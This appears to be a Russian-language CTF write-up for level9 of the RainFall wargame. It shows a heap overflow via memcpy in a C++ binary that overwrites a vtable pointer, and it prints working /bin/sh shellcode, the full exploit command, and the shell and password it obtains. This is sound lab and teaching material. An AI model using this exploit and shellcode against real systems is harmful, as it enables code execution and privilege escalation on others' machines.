### level9
0. Заходим под пользователем: `ssh level9@172.16.188.131 -p 4242` / `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`

1. Запускаем `gdb` и смотрим на доступные функции:
```
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
```
Видим артефакты ООП, предположительно исходник был на c++

2. Соберем наш вариант исходника
3. Заметрим функцию `memcpy` причем она не защищена размером доступного буфера 100байт
4. Дальше видим что у нас дергается `*%edx` если пробежимся по указателям увидем что фактически дергается оператор + для this = 2 экземпляр класса, а именно:
    * `mov    0x10(%esp),%eax` -> тут у нас лежит ссылка на адрес 2 экз класса N (`0x804a078`)
    * `mov    (%eax),%eax` -> тут перейдем по адресу во 2 экз класса N возьмем первые 4 байта и сохраним в `eax` (`0x48	0x88	0x04	0x08`)
    * `mov    (%eax),%edx` -> возьмем значение адреса `0x08048848` и поместим в `eax` (`0x3a	0x87	0x04	0x08`)
    * получим из значения `edx` адрес и дернем его (`0x084873a`)
5. Если посмотреть на то как в памяти лежат куски классов, то увидем что между ними 4 байта и мы можем при копировании памяти затереть значение в указателе на экземпляр 2 класса и потом дернуть shellcode

> Ищем shellcode /bin/sh - гуглим в интернете
> https://shell-storm.org/shellcode/files/shellcode-827.php
```
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		            "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
```

6.
    * Залазим на указатель 2ого класса и переписываем его значение на `0x804a00c` это адрес на начало буффера
    * Начало буфера с адресом `0x804a00c` тоже будет подлежать разименованию и тут нам нужно подложить адрес на шелкод, то есть на следующие 4 байта -> `0x804a01c`
    * С адреса `0x804a01c` будем писать на shellcode остальне забьем пустошкой.

7. Прохождение:

```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```


* Слепок функции `main`

```
$eax = 0x804a078
$ebx = 0x804a078	| 134520952

...
argv[0] = $ebp + 12 = $ebp + 0xc
argc = $ebp + 8
$eip = $ebp + 4
$ebp ->

$esp + 0x1c(28)    | 0x804a008 <- ссылка на 1 экз
$esp + 0x18(24)    | 0x804a078 <- ссылка на 2 экз
$esp + 0x14(20)    | 0x804a008
$esp + 0x10(16)    | 0x804a078



$esp + 4            | 0x804a008
$esp = $ebp - 32    | 0x804a078

```

* Слепок конструктора `N(int n)`
```
$eax = $ebp + 8 = 0x804a008
$edx = 5
param_2 = $ebp + 12
param_1 = $ebp + 8
$eip = $ebp + 4
$ebp = $esp

```

* Слепок метода `setAnnotation(char *str)`
```
$eax = ebp + 8 = (abcd)
$edx = 0x804a008 = 0x804A00C
ebp

esp + 8 = strlen(str)
esp + 4 = str
esp = ebp - 24 = 0x804a00c
```



* Расположение классов в памяти
```
----------------------------------------------------------------
Экземпляр 1 класса N  ->
start -> 0 <- eax | 0x804a008 = 134520840
start.annotation 4 = 0x804a00c
start.annotation + 4 = 0x804a010
annotation[100]


104 - 108 = 5
finish -> 108     | 0x804A074 = 134520840 + 108 = 134520948
----------------------------------------------------------------
gap (4байтов)
----------------------------------------------------------------
Экземпляр 2 класса N  ->
start -> 0 <- eax | 0x804a078 = 134520952




104 - 108 = 4
finish -> 108     | 0x804A0E4 = 134520952 + 108 = 134521060
```